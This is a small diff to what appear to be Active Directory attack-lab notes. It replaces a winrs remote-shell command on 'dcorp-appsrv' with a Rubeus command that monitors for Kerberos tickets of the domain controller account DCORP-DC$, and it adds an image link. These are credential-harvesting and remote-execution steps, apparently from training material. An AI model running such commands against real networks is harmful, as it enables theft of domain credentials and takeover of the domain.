@@ -636,5 +636,6 @@ winrs -r:dcorp-appsrv cmd
 ```
 Launch rubeus
 ```powershell
-winrs -r:dcorp-appsrv cmd
+C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
+![[Pasted image 20231025163953.png]]
